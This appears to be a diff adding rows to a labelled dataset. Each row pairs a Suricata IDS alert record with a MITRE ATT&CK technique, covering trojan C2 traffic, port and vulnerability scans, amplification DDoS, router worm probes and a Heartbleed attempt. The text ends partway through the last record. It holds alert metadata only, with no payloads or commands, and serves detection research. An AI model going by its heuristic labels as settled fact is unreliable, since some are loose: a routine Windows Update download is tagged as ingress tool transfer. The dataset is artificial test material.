+"suricata:2008975","suricata","ET TROJAN Suspicious Malformed Double Accept Header","T1071.001","Web Protocols","T1071","Application Layer Protocol","command-and-control","medium","Trojan malformed Accept header (C2)","datasets/suricata/suricata_2008975_ET_TROJAN_Suspicious_Malformed_Double_Accept_Heade_10.47.42.68_to_64.135.77.30_20180324_143503.json","{
+  ""timestamp"": ""2018-03-24T14:35:03.195686-0600"",
+  ""flow_id"": 201913768856509,
+  ""pcap_cnt"": 1230277,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""10.47.42.68"",
+  ""src_port"": 49943,
+  ""dest_ip"": ""64.135.77.30"",
+  ""dest_port"": 80,
+  ""proto"": ""TCP"",
+  ""http"": {
+    ""hostname"": ""cfg.crawler.com"",
+    ""url"": ""/cr_config.asmx/GetXML?CU=X4NhmpJ8bHT1Mm8dmPR4rQTO44H34Z2Y1VxBQbSIRCGq75nAzQktq44fF3Op-YAheRfB8SqJoxJa1cMJ56P4N6d2aerehcg9p8td9J4KPz34IGtlj_bwYbKzTTIBtz7hK2KGLjNJYrAAruVCiAiv5bnaXFSMNHedOXj3EGG-ltvGdCfNt5W8jneiXdbeYyT7qujAc7CbJcKuxKl9dP4QciLTuVPxUB6hDJIIaG180THgwkKmXq1ZeWcwzNX4B1xNCJn_OvjYO-9b3q2KWdCkqiH9PSJsgJa4Rn4AYzf7GyN55_0rjpsbrK7TYeqo5Pxu6Ec0qYdFQThSeNrTrss1qtX2Auq-fB4NkFVHZ9Xyba52vr6FoZPn76RLSjG3iUMf2dSb0c18Qavzf3EJvOT1InsDwJdZmqcPRbTFaOTC-kPHdwr0qvixT8TNX_ibejsG7mpedP-EnmKj2lZIeb9WnCYPnSEsKCHHcqSVI_BvxY7a4l5BiUAD4EID"",
+    ""http_user_agent"": ""UtilMind HTTPGet"",
+    ""http_content_type"": ""text/xml"",
+    ""http_method"": ""GET"",
+    ""protocol"": ""HTTP/1.1"",
+    ""status"": 200,
+    ""length"": 637
+  },
+  ""app_proto"": ""http"",
+  ""flow"": {
+    ""pkts_toserver"": 7,
+    ""pkts_toclient"": 6,
+    ""bytes_toserver"": 1722,
+    ""bytes_toclient"": 2194,
+    ""start"": ""2018-03-24T14:35:03.052157-0600""
+  },
+  ""tx_id"": 0,
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2008975,
+    ""rev"": 15,
+    ""signature"": ""ET TROJAN Suspicious Malformed Double Accept Header"",
+    ""category"": ""A Network Trojan was detected"",
+    ""severity"": 1
+  }
+}","{""timestamp"": ""2018-03-24T14:35:03.195686-0600"", ""flow_id"": 201913768856509, ""pcap_cnt"": 1230277, ""event_type"": ""alert"", ""src_ip"": ""10.47.42.68"", ""src_port"": 49943, ""dest_ip"": ""64.135.77.30"", ""dest_port"": 80, ""proto"": ""TCP"", ""http"": {""hostname"": ""cfg.crawler.com"", ""url"": ""/cr_config.asmx/GetXML?CU=X4NhmpJ8bHT1Mm8dmPR4rQTO44H34Z2Y1VxBQbSIRCGq75nAzQktq44fF3Op-YAheRfB8SqJoxJa1cMJ56P4N6d2aerehcg9p8td9J4KPz34IGtlj_bwYbKzTTIBtz7hK2KGLjNJYrAAruVCiAiv5bnaXFSMNHedOXj3EGG-ltvGdCfNt5W8jneiXdbeYyT7qujAc7CbJcKuxKl9dP4QciLTuVPxUB6hDJIIaG180THgwkKmXq1ZeWcwzNX4B1xNCJn_OvjYO-9b3q2KWdCkqiH9PSJsgJa4Rn4AYzf7GyN55_0rjpsbrK7TYeqo5Pxu6Ec0qYdFQThSeNrTrss1qtX2Auq-fB4NkFVHZ9Xyba52vr6FoZPn76RLSjG3iUMf2dSb0c18Qavzf3EJvOT1InsDwJdZmqcPRbTFaOTC-kPHdwr0qvixT8TNX_ibejsG7mpedP-EnmKj2lZIeb9WnCYPnSEsKCHHcqSVI_BvxY7a4l5BiUAD4EID"", ""http_user_agent"": ""UtilMind HTTPGet"", ""http_content_type"": ""text/xml"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": 200, ""length"": 637}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": 7, ""pkts_toclient"": 6, ""bytes_toserver"": 1722, ""bytes_toclient"": 2194, ""start"": ""2018-03-24T14:35:03.052157-0600""}, ""tx_id"": 0, ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2008975, ""rev"": 15, ""severity"": 1}}"
+"suricata:2013263","suricata","ET SCAN Nessus FTP Scan detected (ftp_anonymous.nasl)","T1595.002","Vulnerability Scanning","T1595","Active Scanning","reconnaissance","high","Nessus FTP vuln scan","datasets/suricata/suricata_2013263_ET_SCAN_Nessus_FTP_Scan_detected_(ftp_anonymous.na_10.240.105.57_to_10.47.24.80_20180323_162214.json","{
+  ""timestamp"": ""2018-03-23T16:22:14.172034-0600"",
+  ""flow_id"": 344295283766716,
+  ""pcap_cnt"": 417921,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""10.240.105.57"",
+  ""src_port"": 46345,
+  ""dest_ip"": ""10.47.24.80"",
+  ""dest_port"": 21,
+  ""proto"": ""TCP"",
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2013263,
+    ""rev"": 3,
+    ""signature"": ""ET SCAN Nessus FTP Scan detected (ftp_anonymous.nasl)"",
+    ""category"": ""Attempted Information Leak"",
+    ""severity"": 2
+  },
+  ""app_proto"": ""ftp"",
+  ""app_proto_tc"": ""failed"",
+  ""flow"": {
+    ""pkts_toserver"": 9,
+    ""pkts_toclient"": 6,
+    ""bytes_toserver"": 666,
+    ""bytes_toclient"": 610,
+    ""start"": ""2018-03-23T16:22:14.144828-0600""
+  }
+}","{""timestamp"": ""2018-03-23T16:22:14.172034-0600"", ""flow_id"": 344295283766716, ""pcap_cnt"": 417921, ""event_type"": ""alert"", ""src_ip"": ""10.240.105.57"", ""src_port"": 46345, ""dest_ip"": ""10.47.24.80"", ""dest_port"": 21, ""proto"": ""TCP"", ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2013263, ""rev"": 3, ""severity"": 2}, ""app_proto"": ""ftp"", ""app_proto_tc"": ""failed"", ""flow"": {""pkts_toserver"": 9, ""pkts_toclient"": 6, ""bytes_toserver"": 666, ""bytes_toclient"": 610, ""start"": ""2018-03-23T16:22:14.144828-0600""}}"
+"suricata:2014939","suricata","ET POLICY DNS Query for TOR Hidden Domain .onion Accessible Via TOR","T1090.003","Multi-hop Proxy","T1090","Proxy","command-and-control","high","DNS query for .onion (Tor)","datasets/suricata/suricata_2014939_ET_POLICY_DNS_Query_for_TOR_Hidden_Domain_.onion_A_10.47.5.156_to_10.10.5.1_20180324_111033.json","{
+  ""timestamp"": ""2018-03-24T11:10:33.801554-0600"",
+  ""flow_id"": 1715339180718866,
+  ""pcap_cnt"": 1682284,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""10.47.5.156"",
+  ""src_port"": 10591,
+  ""dest_ip"": ""10.10.5.1"",
+  ""dest_port"": 53,
+  ""proto"": ""UDP"",
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2014939,
+    ""rev"": 1,
+    ""signature"": ""ET POLICY DNS Query for TOR Hidden Domain .onion Accessible Via TOR"",
+    ""category"": ""Potential Corporate Privacy Violation"",
+    ""severity"": 1
+  },
+  ""app_proto"": ""dns"",
+  ""flow"": {
+    ""pkts_toserver"": 1,
+    ""pkts_toclient"": 0,
+    ""bytes_toserver"": 87,
+    ""bytes_toclient"": 0,
+    ""start"": ""2018-03-24T11:10:33.801554-0600""
+  }
+}","{""timestamp"": ""2018-03-24T11:10:33.801554-0600"", ""flow_id"": 1715339180718866, ""pcap_cnt"": 1682284, ""event_type"": ""alert"", ""src_ip"": ""10.47.5.156"", ""src_port"": 10591, ""dest_ip"": ""10.10.5.1"", ""dest_port"": 53, ""proto"": ""UDP"", ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2014939, ""rev"": 1, ""severity"": 1}, ""app_proto"": ""dns"", ""flow"": {""pkts_toserver"": 1, ""pkts_toclient"": 0, ""bytes_toserver"": 87, ""bytes_toclient"": 0, ""start"": ""2018-03-24T11:10:33.801554-0600""}}"
+"suricata:2017259","suricata","ET TROJAN Generic - POST To .php w/Extended ASCII Characters","T1071.001","Web Protocols","T1071","Application Layer Protocol","command-and-control","high","Trojan POST to .php (C2)","datasets/suricata/suricata_2017259_ET_TROJAN_Generic_-_POST_To_.php_w_Extended_ASCII__10.47.6.59_to_104.225.222.243_20180323_164814.json","{
+  ""timestamp"": ""2018-03-23T16:48:14.914001-0600"",
+  ""flow_id"": 252176927459372,
+  ""pcap_cnt"": 1452321,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""10.47.6.59"",
+  ""src_port"": 40575,
+  ""dest_ip"": ""104.225.222.243"",
+  ""dest_port"": 8080,
+  ""proto"": ""TCP"",
+  ""tx_id"": 0,
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2017259,
+    ""rev"": 12,
+    ""signature"": ""ET TROJAN Generic - POST To .php w/Extended ASCII Characters"",
+    ""category"": ""A Network Trojan was detected"",
+    ""severity"": 1
+  },
+  ""http"": {
+    ""hostname"": ""blog.cloudkicker.co"",
+    ""url"": ""/blog/index.php"",
+    ""http_user_agent"": ""Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"",
+    ""http_method"": ""POST"",
+    ""protocol"": ""HTTP/1.1"",
+    ""status"": 200,
+    ""length"": 0
+  },
+  ""app_proto"": ""http"",
+  ""flow"": {
+    ""pkts_toserver"": 7,
+    ""pkts_toclient"": 6,
+    ""bytes_toserver"": 1562,
+    ""bytes_toclient"": 446,
+    ""start"": ""2018-03-23T16:48:14.821292-0600""
+  }
+}","{""timestamp"": ""2018-03-23T16:48:14.914001-0600"", ""flow_id"": 252176927459372, ""pcap_cnt"": 1452321, ""event_type"": ""alert"", ""src_ip"": ""10.47.6.59"", ""src_port"": 40575, ""dest_ip"": ""104.225.222.243"", ""dest_port"": 8080, ""proto"": ""TCP"", ""tx_id"": 0, ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2017259, ""rev"": 12, ""severity"": 1}, ""http"": {""hostname"": ""blog.cloudkicker.co"", ""url"": ""/blog/index.php"", ""http_user_agent"": ""Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"", ""http_method"": ""POST"", ""protocol"": ""HTTP/1.1"", ""status"": 200, ""length"": 0}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": 7, ""pkts_toclient"": 6, ""bytes_toserver"": 1562, ""bytes_toclient"": 446, ""start"": ""2018-03-23T16:48:14.821292-0600""}}"
+"suricata:2017615","suricata","ET SCAN NETWORK Outgoing Masscan detected","T1046","Network Service Discovery","T1046","Network Service Discovery","discovery","high","Outgoing masscan port scan","datasets/suricata/suricata_2017615_ET_SCAN_NETWORK_Outgoing_Masscan_detected_10.184.180.10_to_10.47.6.142_20180323_165634.json","{
+  ""timestamp"": ""2018-03-23T16:56:34.333940-0600"",
+  ""flow_id"": 1244761081837218,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""10.184.180.10"",
+  ""src_port"": 11355,
+  ""dest_ip"": ""10.47.6.142"",
+  ""dest_port"": 80,
+  ""proto"": ""TCP"",
+  ""tx_id"": 0,
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2017615,
+    ""rev"": 4,
+    ""signature"": ""ET SCAN NETWORK Outgoing Masscan detected"",
+    ""category"": ""Detection of a Network Scan"",
+    ""severity"": 3
+  },
+  ""http"": {
+    ""url"": ""/"",
+    ""http_user_agent"": ""masscan/1.0 (https://github.com/robertdavidgraham/masscan)"",
+    ""http_method"": ""GET"",
+    ""protocol"": ""HTTP/1.0"",
+    ""length"": 0
+  },
+  ""app_proto"": ""http"",
+  ""flow"": {
+    ""pkts_toserver"": 6,
+    ""pkts_toclient"": 4,
+    ""bytes_toserver"": 554,
+    ""bytes_toclient"": 1300,
+    ""start"": ""2018-03-23T16:56:28.390818-0600""
+  }
+}","{""timestamp"": ""2018-03-23T16:56:34.333940-0600"", ""flow_id"": 1244761081837218, ""event_type"": ""alert"", ""src_ip"": ""10.184.180.10"", ""src_port"": 11355, ""dest_ip"": ""10.47.6.142"", ""dest_port"": 80, ""proto"": ""TCP"", ""tx_id"": 0, ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2017615, ""rev"": 4, ""severity"": 3}, ""http"": {""url"": ""/"", ""http_user_agent"": ""masscan/1.0 (https://github.com/robertdavidgraham/masscan)"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.0"", ""length"": 0}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": 6, ""pkts_toclient"": 4, ""bytes_toserver"": 554, ""bytes_toclient"": 1300, ""start"": ""2018-03-23T16:56:28.390818-0600""}}"
+"suricata:2017919","suricata","ET DOS Possible NTP DDoS Inbound Frequent Un-Authed MON_LIST Requests IMPL 0x03","T1498.002","Reflection Amplification","T1498","Network Denial of Service","impact","high","NTP MON_LIST DDoS amplification","datasets/suricata/suricata_2017919_ET_DOS_Possible_NTP_DDoS_Inbound_Frequent_Un-Authe_10.240.105.57_to_10.47.3.100_20180323_161025.json","{
+  ""timestamp"": ""2018-03-23T16:10:25.202380-0600"",
+  ""flow_id"": 1569003014264416,
+  ""pcap_cnt"": 567362,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""10.240.105.57"",
+  ""src_port"": 44937,
+  ""dest_ip"": ""10.47.3.100"",
+  ""dest_port"": 123,
+  ""proto"": ""UDP"",
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2017919,
+    ""rev"": 2,
+    ""signature"": ""ET DOS Possible NTP DDoS Inbound Frequent Un-Authed MON_LIST Requests IMPL 0x03"",
+    ""category"": ""Attempted Denial of Service"",
+    ""severity"": 2
+  },
+  ""app_proto"": ""failed"",
+  ""flow"": {
+    ""pkts_toserver"": 2,
+    ""pkts_toclient"": 0,
+    ""bytes_toserver"": 180,
+    ""bytes_toclient"": 0,
+    ""start"": ""2018-03-23T16:10:25.202336-0600""
+  }
+}","{""timestamp"": ""2018-03-23T16:10:25.202380-0600"", ""flow_id"": 1569003014264416, ""pcap_cnt"": 567362, ""event_type"": ""alert"", ""src_ip"": ""10.240.105.57"", ""src_port"": 44937, ""dest_ip"": ""10.47.3.100"", ""dest_port"": 123, ""proto"": ""UDP"", ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2017919, ""rev"": 2, ""severity"": 2}, ""app_proto"": ""failed"", ""flow"": {""pkts_toserver"": 2, ""pkts_toclient"": 0, ""bytes_toserver"": 180, ""bytes_toclient"": 0, ""start"": ""2018-03-23T16:10:25.202336-0600""}}"
+"suricata:2018131","suricata","ET WORM TheMoon.linksys.router 1","T1190","Exploit Public-Facing Application","T1190","Exploit Public-Facing Application","initial-access","high","TheMoon router worm (exploit public app)","datasets/suricata/suricata_2018131_ET_WORM_TheMoon.linksys.router_1_10.128.0.221_to_10.47.1.59_20180323_141952.json","{
+  ""timestamp"": ""2018-03-23T14:19:52.786594-0600"",
+  ""flow_id"": 152195947879736,
+  ""pcap_cnt"": 202812,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""10.128.0.221"",
+  ""src_port"": 50838,
+  ""dest_ip"": ""10.47.1.59"",
+  ""dest_port"": 8080,
+  ""proto"": ""TCP"",
+  ""tx_id"": 0,
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2018131,
+    ""rev"": 5,
+    ""signature"": ""ET WORM TheMoon.linksys.router 1"",
+    ""category"": ""A Network Trojan was detected"",
+    ""severity"": 1
+  },
+  ""http"": {
+    ""hostname"": ""10.47.1.59"",
+    ""url"": ""/HNAP1/"",
+    ""http_user_agent"": ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"",
+    ""http_content_type"": ""text/html"",
+    ""http_method"": ""GET"",
+    ""protocol"": ""HTTP/1.1"",
+    ""status"": 404,
+    ""length"": 345
+  },
+  ""app_proto"": ""http"",
+  ""flow"": {
+    ""pkts_toserver"": 7,
+    ""pkts_toclient"": 8,
+    ""bytes_toserver"": 1092,
+    ""bytes_toclient"": 1518,
+    ""start"": ""2018-03-23T14:19:52.777528-0600""
+  }
+}","{""timestamp"": ""2018-03-23T14:19:52.786594-0600"", ""flow_id"": 152195947879736, ""pcap_cnt"": 202812, ""event_type"": ""alert"", ""src_ip"": ""10.128.0.221"", ""src_port"": 50838, ""dest_ip"": ""10.47.1.59"", ""dest_port"": 8080, ""proto"": ""TCP"", ""tx_id"": 0, ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2018131, ""rev"": 5, ""severity"": 1}, ""http"": {""hostname"": ""10.47.1.59"", ""url"": ""/HNAP1/"", ""http_user_agent"": ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": 404, ""length"": 345}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": 7, ""pkts_toclient"": 8, ""bytes_toserver"": 1092, ""bytes_toclient"": 1518, ""start"": ""2018-03-23T14:19:52.777528-0600""}}"
+"suricata:2018372","suricata","ET CURRENT_EVENTS Malformed HeartBeat Request","T1190","Exploit Public-Facing Application","T1190","Exploit Public-Facing Application","initial-access","high","Heartbleed malformed heartbeat","datasets/suricata/suricata_2018372_ET_CURRENT_EVENTS_Malformed_HeartBeat_Request_10.128.0.221_to_10.47.1.1_20180323_142155.json","{
+  ""timestamp"": ""2018-03-23T14:21:55.041780-0600"",
+  ""flow_id"": 1393770069449632,
+  ""pcap_cnt"": 1401594,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""10.128.0.221"",
+  ""src_port"": 46962,
+  ""dest_ip"": ""10.47.1.1"",
+  ""dest_port"": 443,
+  ""proto"": ""TCP"",
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2018372,
+    ""rev"": 2,
+    ""signature"": ""ET CURRENT_EVENTS Malformed HeartBeat Request"",
+    ""category"": ""Potentially Bad Traffic"",
+    ""severity"": 2
+  },
+  ""tls"": {
+    ""subject"": ""C=US, ST=CA, L=Santa Clara, O=Palo Alto Networks, CN=d92c11ece94546685d283c62baa542e1f4e65323e4c865aa71cd5bff8dfc95b7/emailAddress=support@paloaltonetworks.com"",
+    ""issuerdn"": ""C=US, ST=CA, L=Santa Clara, O=Palo Alto Networks, OU=Support, CN=localhost/emailAddress=support@paloaltonetworks.com"",
+    ""serial"": ""2C:A6:E0:4A:49:EF:E9:5D"",
+    ""fingerprint"": ""22:0e:91:8f:fb:d0:f8:82:c9:79:4c:7f:b9:5a:8a:ea:7f:ca:58:b6"",
+    ""version"": ""TLS 1.2"",
+    ""notbefore"": ""2018-02-22T22:36:47"",
+    ""notafter"": ""2028-02-20T22:36:47""
+  },
+  ""vars"": {
+    ""flowbits"": {
+      ""ET.MalformedTLSHB"": true,
+      ""ET.HB.Request.CI"": true
+    }
+  },
+  ""app_proto"": ""tls"",
+  ""flow"": {
+    ""pkts_toserver"": 9,
+    ""pkts_toclient"": 8,
+    ""bytes_toserver"": 2056,
+    ""bytes_toclient"": 3738,
+    ""start"": ""2018-03-23T14:21:55.023456-0600""
+  }
+}","{""timestamp"": ""2018-03-23T14:21:55.041780-0600"", ""flow_id"": 1393770069449632, ""pcap_cnt"": 1401594, ""event_type"": ""alert"", ""src_ip"": ""10.128.0.221"", ""src_port"": 46962, ""dest_ip"": ""10.47.1.1"", ""dest_port"": 443, ""proto"": ""TCP"", ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2018372, ""rev"": 2, ""severity"": 2}, ""tls"": {""subject"": ""C=US, ST=CA, L=Santa Clara, O=Palo Alto Networks, CN=d92c11ece94546685d283c62baa542e1f4e65323e4c865aa71cd5bff8dfc95b7/emailAddress=support@paloaltonetworks.com"", ""issuerdn"": ""C=US, ST=CA, L=Santa Clara, O=Palo Alto Networks, OU=Support, CN=localhost/emailAddress=support@paloaltonetworks.com"", ""serial"": ""2C:A6:E0:4A:49:EF:E9:5D"", ""fingerprint"": ""22:0e:91:8f:fb:d0:f8:82:c9:79:4c:7f:b9:5a:8a:ea:7f:ca:58:b6"", ""version"": ""TLS 1.2"", ""notbefore"": ""2018-02-22T22:36:47"", ""notafter"": ""2028-02-20T22:36:47""}, ""vars"": {""flowbits"": {""ET.MalformedTLSHB"": true, ""ET.HB.Request.CI"": true}}, ""app_proto"": ""tls"", ""flow"": {""pkts_toserver"": 9, ""pkts_toclient"": 8, ""bytes_toserver"": 2056, ""bytes_toclient"": 3738, ""start"": ""2018-03-23T14:21:55.023456-0600""}}"
+"suricata:2018959","suricata","ET POLICY PE EXE or DLL Windows file download HTTP","T1105","Ingress Tool Transfer","T1105","Ingress Tool Transfer","command-and-control","high","PE EXE/DLL download over HTTP","datasets/suricata/suricata_2018959_ET_POLICY_PE_EXE_or_DLL_Windows_file_download_HTTP_13.107.4.50_to_10.47.1.10_20180323_141143.json","{
+  ""timestamp"": ""2018-03-23T14:11:43.138063-0600"",
+  ""flow_id"": 1579894582828890,
+  ""pcap_cnt"": 496807,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""13.107.4.50"",
+  ""src_port"": 80,
+  ""dest_ip"": ""10.47.1.10"",
+  ""dest_port"": 49761,
+  ""proto"": ""TCP"",
+  ""tx_id"": 1,
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2018959,
+    ""rev"": 3,
+    ""signature"": ""ET POLICY PE EXE or DLL Windows file download HTTP"",
+    ""category"": ""Potential Corporate Privacy Violation"",
+    ""severity"": 1
+  },
+  ""http"": {
+    ""hostname"": ""au.download.windowsupdate.com"",
+    ""url"": ""/c/msdownload/update/software/defu/2018/03/am_delta_patch_1.263.1011.0_269cdc2019159c2b4a36a8e9aa0702270852282d.exe"",
+    ""http_user_agent"": ""Microsoft BITS/7.8"",
+    ""http_content_type"": ""application/octet-stream"",
+    ""http_method"": ""GET"",
+    ""protocol"": ""HTTP/1.1"",
+    ""status"": 206,
+    ""length"": 6423
+  },
+  ""vars"": {
+    ""flowbits"": {
+      ""exe.no.referer"": true,
+      ""ET.http.binary"": true
+    }
+  },
+  ""app_proto"": ""http"",
+  ""flow"": {
+    ""pkts_toserver"": 12,
+    ""pkts_toclient"": 19,
+    ""bytes_toserver"": 1916,
+    ""bytes_toclient"": 17349,
+    ""start"": ""2018-03-23T14:11:16.876378-0600""
+  }
+}","{""timestamp"": ""2018-03-23T14:11:43.138063-0600"", ""flow_id"": 1579894582828890, ""pcap_cnt"": 496807, ""event_type"": ""alert"", ""src_ip"": ""13.107.4.50"", ""src_port"": 80, ""dest_ip"": ""10.47.1.10"", ""dest_port"": 49761, ""proto"": ""TCP"", ""tx_id"": 1, ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2018959, ""rev"": 3, ""severity"": 1}, ""http"": {""hostname"": ""au.download.windowsupdate.com"", ""url"": ""/c/msdownload/update/software/defu/2018/03/am_delta_patch_1.263.1011.0_269cdc2019159c2b4a36a8e9aa0702270852282d.exe"", ""http_user_agent"": ""Microsoft BITS/7.8"", ""http_content_type"": ""application/octet-stream"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": 206, ""length"": 6423}, ""vars"": {""flowbits"": {""exe.no.referer"": true, ""ET.http.binary"": true}}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": 12, ""pkts_toclient"": 19, ""bytes_toserver"": 1916, ""bytes_toclient"": 17349, ""start"": ""2018-03-23T14:11:16.876378-0600""}}"
+"suricata:2019020","suricata","ET DOS Possible NTP DDoS Inbound Frequent Un-Authed GET_RESTRICT Requests IMPL 0x03","T1498.002","Reflection Amplification","T1498","Network Denial of Service","impact","high","NTP GET_RESTRICT DDoS amplification","datasets/suricata/suricata_2019020_ET_DOS_Possible_NTP_DDoS_Inbound_Frequent_Un-Authe_10.128.18.12_to_10.47.6.10_20180324_181408.json","{
+  ""timestamp"": ""2018-03-24T18:14:08.817152-0600"",
+  ""flow_id"": 322100700149756,
+  ""pcap_cnt"": 221890,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""10.128.18.12"",
+  ""src_port"": 63470,
+  ""dest_ip"": ""10.47.6.10"",
+  ""dest_port"": 123,
+  ""proto"": ""UDP"",
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2019020,
+    ""rev"": 3,
+    ""signature"": ""ET DOS Possible NTP DDoS Inbound Frequent Un-Authed GET_RESTRICT Requests IMPL 0x03"",
+    ""category"": ""Attempted Denial of Service"",
+    ""severity"": 2
+  },
+  ""app_proto"": ""failed"",
+  ""flow"": {
+    ""pkts_toserver"": 2,
+    ""pkts_toclient"": 0,
+    ""bytes_toserver"": 120,
+    ""bytes_toclient"": 0,
+    ""start"": ""2018-03-24T18:14:08.817148-0600""
+  }
+}","{""timestamp"": ""2018-03-24T18:14:08.817152-0600"", ""flow_id"": 322100700149756, ""pcap_cnt"": 221890, ""event_type"": ""alert"", ""src_ip"": ""10.128.18.12"", ""src_port"": 63470, ""dest_ip"": ""10.47.6.10"", ""dest_port"": 123, ""proto"": ""UDP"", ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2019020, ""rev"": 3, ""severity"": 2}, ""app_proto"": ""failed"", ""flow"": {""pkts_toserver"": 2, ""pkts_toclient"": 0, ""bytes_toserver"": 120, ""bytes_toclient"": 0, ""start"": ""2018-03-24T18:14:08.817148-0600""}}"
+"suricata:2019102","suricata","ET DOS Possible SSDP Amplification Scan in Progress","T1498.002","Reflection Amplification","T1498","Network Denial of Service","impact","high","SSDP amplification","datasets/suricata/suricata_2019102_ET_DOS_Possible_SSDP_Amplification_Scan_in_Progres_10.128.0.205_to_10.47.22.186_20180324_181748.json","{
+  ""timestamp"": ""2018-03-24T18:17:48.093439-0600"",
+  ""flow_id"": 511740700552445,
+  ""pcap_cnt"": 345464,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""10.128.0.205"",
+  ""src_port"": 54819,
+  ""dest_ip"": ""10.47.22.186"",
+  ""dest_port"": 1900,
+  ""proto"": ""UDP"",
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2019102,
+    ""rev"": 1,
+    ""signature"": ""ET DOS Possible SSDP Amplification Scan in Progress"",
+    ""category"": ""Attempted Denial of Service"",
+    ""severity"": 2
+  },
+  ""app_proto"": ""failed"",
+  ""flow"": {
+    ""pkts_toserver"": 2,
+    ""pkts_toclient"": 0,
+    ""bytes_toserver"": 272,
+    ""bytes_toclient"": 0,
+    ""start"": ""2018-03-24T18:17:48.093437-0600""
+  }
+}","{""timestamp"": ""2018-03-24T18:17:48.093439-0600"", ""flow_id"": 511740700552445, ""pcap_cnt"": 345464, ""event_type"": ""alert"", ""src_ip"": ""10.128.0.205"", ""src_port"": 54819, ""dest_ip"": ""10.47.22.186"", ""dest_port"": 1900, ""proto"": ""UDP"", ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2019102, ""rev"": 1, ""severity"": 2}, ""app_proto"": ""failed"", ""flow"": {""pkts_toserver"": 2, ""pkts_toclient"": 0, ""bytes_toserver"": 272, ""bytes_toclient"": 0, ""start"": ""2018-03-24T18:17:48.093437-0600""}}"
+"suricata:2020912","suricata","ET WEB_SERVER Possible IIS Integer Overflow DoS (CVE-2015-1635)","T1499","Endpoint Denial of Service","T1499","Endpoint Denial of Service","impact","medium","IIS integer overflow DoS (CVE-2015-1635)","datasets/suricata/suricata_2020912_ET_WEB_SERVER_Possible_IIS_Integer_Overflow_DoS_(C_10.240.105.57_to_10.47.3.218_20180323_162523.json","{
+  ""timestamp"": ""2018-03-23T16:25:23.232831-0600"",
+  ""flow_id"": 620925549761330,
+  ""pcap_cnt"": 586491,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""10.240.105.57"",
+  ""src_port"": 44391,
+  ""dest_ip"": ""10.47.3.218"",
+  ""dest_port"": 80,
+  ""proto"": ""TCP"",
+  ""tx_id"": 0,
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2020912,
+    ""rev"": 2,
+    ""signature"": ""ET WEB_SERVER Possible IIS Integer Overflow DoS (CVE-2015-1635)"",
+    ""category"": ""Web Application Attack"",
+    ""severity"": 1
+  },
+  ""http"": {
+    ""hostname"": ""10.47.3.218"",
+    ""url"": ""/"",
+    ""http_user_agent"": ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"",
+    ""http_content_type"": ""text/plain"",
+    ""http_method"": ""GET"",
+    ""protocol"": ""HTTP/1.1"",
+    ""status"": 401,
+    ""length"": 16
+  },
+  ""app_proto"": ""http"",
+  ""flow"": {
+    ""pkts_toserver"": 7,
+    ""pkts_toclient"": 4,
+    ""bytes_toserver"": 1156,
+    ""bytes_toclient"": 1344,
+    ""start"": ""2018-03-23T16:25:23.217906-0600""
+  }
